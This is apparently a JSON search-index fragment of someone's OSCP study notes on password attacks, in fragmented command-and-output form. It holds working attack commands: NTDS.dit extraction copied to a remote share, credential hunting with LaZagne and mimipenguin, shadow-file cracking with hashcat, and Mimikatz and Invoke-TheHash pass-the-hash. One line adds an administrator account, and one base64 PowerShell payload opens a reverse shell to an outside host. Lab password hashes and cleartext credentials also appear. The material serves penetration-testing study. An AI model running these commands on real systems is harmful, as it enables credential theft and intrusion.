crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt Evil-WinRM* PS C:\\\u003e vssadmin CREATE SHADOW /For=C: vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool (C) Copyright 2001-2013 Microsoft Corp. Successfully created shadow copy for 'C:\\' Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a} Shadow Copy Volume Name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2 *Evil-WinRM* PS C:\\NTDS\u003e cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\NTDS\\NTDS.dit c:\\NTDS\\NTDS.dit *Evil-WinRM* PS C:\\NTDS\u003e cmd.exe /c move C:\\NTDS\\NTDS.dit \\\\10.10.15.30\\CompData cube111@local[/local]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds Credential Hunting Windows\nPasswords Passphrases Keys Username User account Creds Users Passkeys Passphrases configuration dbcredential dbpassword pwd Login Credentials Running Lazagne All Credential Hunting in Windows\nC:\\Users\\bob\\Desktop\u003e start lazagne.exe all Using findstr We can also use findstr to search from patterns across many types of files. Keeping in mind common key terms, we can use variations of this command to discover credentials on a Windows target:\nCredential Hunting in Windows\nC:\\\u003e findstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml dir /s /b *password*.*\nHere are some other places we should keep in mind when credential hunting:\nPasswords in Group Policy in the SYSVOL share Passwords in scripts in the SYSVOL share Password in scripts on IT shares Passwords in web.config files on dev machines and IT shares unattend.xml Passwords in the AD user or computer description fields KeePass databases ‚Äì\u003e pull hash, crack and get loads of access. Found on user systems and shares Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint credential hunting linux¬†FUCKING USELESS\nconfig\ncry0l1t3@unixclient:~$ for l in $(echo \".conf .config .cnf\");do echo -e \"\\nFile extension: \" $l; find / -name *$l 2\u003e/dev/null | grep -v \"lib\\|fonts\\|share\\|core\" ; cry0l1t3@unixclient:~$ for i in $(find / -name *.cnf 2\u003e/dev/null | grep -v \"doc\\|lib\");do echo -e \"\\nFile: \" $i; grep \"user\\|password\\|pass\" $i 2\u003e/dev/null | grep -v \"\\#\";done Databases Credential Hunting in Linux\ncry0l1t3@unixclient:~$ for l in $(echo \".sql .db .*db .db*\");do echo -e \"\\nDB File extension: \" $l; find / -name *$l 2\u003e/dev/null | grep -v \"doc\\|lib\\|headers\\|share\\|man\";done text files\ncry0l1t3@unixclient:~$ find /home/* -type f -name \"*.txt\" -o ! -name \"*.*\" scripts\ncry0l1t3@unixclient:~$ for l in $(echo \".py .pyc .pl .go .jar .c .sh\");do echo -e \"\\nFile extension: \" $l; find / -name *$l 2\u003e/dev/null | grep -v \"doc\\|lib\\|headers\\|share\";done SSH Private Keys Credential Hunting in Linux\ncry0l1t3@unixclient:~$ grep -rnw \"PRIVATE KEY\" /home/* 2\u003e/dev/null | grep \":1\" /home/cry0l1t3/.ssh/internal_db:1:-----BEGIN OPENSSH PRIVATE KEY----- SSH Public Keys Credential Hunting in Linux\ncry0l1t3@unixclient:~$ grep -rnw \"ssh-rsa\" /home/* 2\u003e/dev/null | grep \":1\" /home/cry0l1t3/.ssh/internal_db.pub:1:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCraK Cronjobs Credential Hunting in Linux\ncry0l1t3@unixclient:~$ cat /etc/crontab History\ncry0l1t3@unixclient:~$ tail -n5 /home/*/.bash* An essential concept of Linux systems is log files that are stored in text files. Many programs, especially all services and the system itself, write such files. In them, we find system errors, detect problems regarding services or follow what the system is doing in the background. The entirety of log files can be divided into four categories:\nApplication Logs Event Logs Service Logs System Logs Many different logs exist on the system. These can vary depending on the applications installed, but here are some of the most important ones:\nLog File Description /var/log/messages Generic system activity logs. /var/log/syslog Generic system activity logs. /var/log/auth.log (Debian) All authentication related logs. /var/log/secure (RedHat/CentOS) All authentication related logs. /var/log/boot.log Booting information. /var/log/dmesg Hardware and drivers related information and logs. /var/log/kern.log Kernel related warnings, errors and logs. /var/log/faillog Failed login attempts. /var/log/cron Information related to cron jobs. /var/log/mail.log All mail server related logs. /var/log/httpd All Apache related logs. /var/log/mysqld.log All MySQL server related logs. cry0l1t3@unixclient:~$ for i in $(ls /var/log/* 2\u003e/dev/null);do GREP=$(grep \"accepted\\|session opened\\|session closed\\|failure\\|failed\\|ssh\\|password changed\\|new user\\|delete user\\|sudo\\|COMMAND\\=\\|logs\" $i 2\u003e/dev/null); if [[ $GREP ]];then echo -e \"\\n#### Log file: \" $i; grep \"accepted\\|session opened\\|session closed\\|failure\\|failed\\|ssh\\|password changed\\|new user\\|delete user\\|sudo\\|COMMAND\\=\\|logs\" $i 2\u003e/dev/null;fi;done Memory - Mimipenguin Credential Hunting in Linux\ncry0l1t3@unixclient:~$ sudo python3 mimipenguin.py [sudo] password for cry0l1t3: [SYSTEM - GNOME]\tcry0l1t3:WLpAEXFa0SbqOHY cry0l1t3@unixclient:~$ sudo bash mimipenguin.sh [sudo] password for cry0l1t3: MimiPenguin Results: [SYSTEM - GNOME] cry0l1t3:WLpAEXFa0SbqOHY Memory - LaZagne Credential Hunting in Linux\ncry0l1t3@unixclient:~$ sudo python2.7 laZagne.py all Browsers Firefox Stored Credentials Credential Hunting in Linux\ncry0l1t3@unixclient:~$ ls -l .mozilla/firefox/ | grep default Decrypting Firefox Credentials Credential Hunting in Linux\ncube111@local[/local]$ python3.9 firefox_decrypt.py Browsers - LaZagne Credential Hunting in Linux\ncry0l1t3@unixclient:~$ python3 laZagne.py browsers Passwd, Shadow \u0026 Opasswd mechanisms is Pluggable Authentication Modules (PAM). The modules used for this are called pam_unix.so or pam_unix2.so and are located in /usr/lib/x86_x64-linux-gnu/security/ in Debian based distributions. These modules manage user information, authentication, sessions, current passwords, and old passwords. Fo\nUsually, we find the value x in this field, which means that the passwords are stored in an encrypted form in the /etc/shadow file. However, it can also be that the /etc/passwd file is writeable by mistake. This would allow us to clear this field for the user root so that the password info field is empty. This will cause the system not to send a password prompt when a user tries to log in as root.\nShadow Format : $6$wBRzy$...SNIP...x9cDWUxW1 : 18937 : 0 : 99 999 : 7 : : : Username Encrypted password Last PW change Min. PW age Max. PW age Warning period Inactivity period Expiration date cube111@local[/local]$ sudo cp /etc/shadow /tmp/shadow.bak cube111@local[/local]$ unshadow /tmp/passwd.bak /tmp/shadow.bak \u003e /tmp/unshadowed.hashes Hashcat - Cracking Unshadowed Hashes Passwd, Shadow \u0026 Opasswd\ncube111@local[/local]$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked Hashcat - Cracking MD5 Hashes Passwd, Shadow \u0026 Opasswd\ncube111@local[/local]$ cat md5-hashes.list qNDkF0zJ3v8ylCOrKB0kt0 E9uMSmiQeRh4pAAgzuvkq1 Passwd, Shadow \u0026 Opasswd\ncube111@local[/local]$ hashcat -m 500 -a 0 md5-hashes.list rockyou.txt Opasswd The PAM library (pam_unix.so) can prevent reusing old passwords. The file where old passwords are stored is the /etc/security/opasswd. Administrator/root permissions are also required to read the file if the permissions for this file have not been changed manually.\nReading /etc/security/opasswd Passwd, Shadow \u0026 Opasswd\ncube111@local[/local]$ sudo cat /etc/security/opasswd cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1 Pass the Hash with Mimikatz (Windows) /user - The user name we want to impersonate. /rc4 or /NTLM - NTLM hash of the user's password. /domain - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.). /run - The program we want to run with the user's context (if not specified, it will launch cmd.exe). c:\\tools\u003e mimikatz.exe privilege::debug \"sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.local /run:cmd.exe\" exit 2nd method\nhttps://github.com/Kevin-Robertson/Invoke-TheHash\nsmbexec\nInvoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.local -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command \"net user mark Password123 /add \u0026\u0026 net localgroup administrators mark /add\" -Verbose wmiexec\nPS c:\\tools\\Invoke-TheHash\u003e Invoke-WMIExec -Target DC01 -Domain inlanefreight.local -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command \"powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZReadABTAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==",
    "description": "Username: kali\nHash Algorithm: Yescrypt ($y$)\nSalt: lxhAOT0lf3zR/cuNiG8OX.\nHash: XEOi/b8Qy6I3nbYZl9RJnMQw3HiykbffrD6X1okqi.0\nLast Change: 20176 (around 2025)\nMin Days: 0 (can change password any time)\nMax Days: 99999 (password never expires)\nWarning: 7 days before expiry\nirfan:$y$j9T$u7t3UrHAk.3WIkkecUE1y0$Q/aAFtrBrik/LKHFUp7vahK72JQtJDpLKRgKWAMAXaD:20120:0:99999:7:::\njohn\n‚Äújohn.pot‚Äù (~/.john/john.pot)\njohn ‚Äìlist=formats\nOr:\nbash\nCopy\nEdit\njohn ‚Äìshow hashes.txt\n(It will try to parse and show hash types.)\nCracking with John Hash Format Example Command Description afs john --format=afs hashes_to_crack.txt AFS (Andrew File System) password hashes bfegg john --format=bfegg hashes_to_crack.",
    "tags": [],
    "title": "password attacks",
    "uri": "/oscp-notes/password-attacks/index.html"
  },
  {
    "breadcrumb": "DrakonOps",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tags",
    "uri": "/tags/index.html"
  }
]
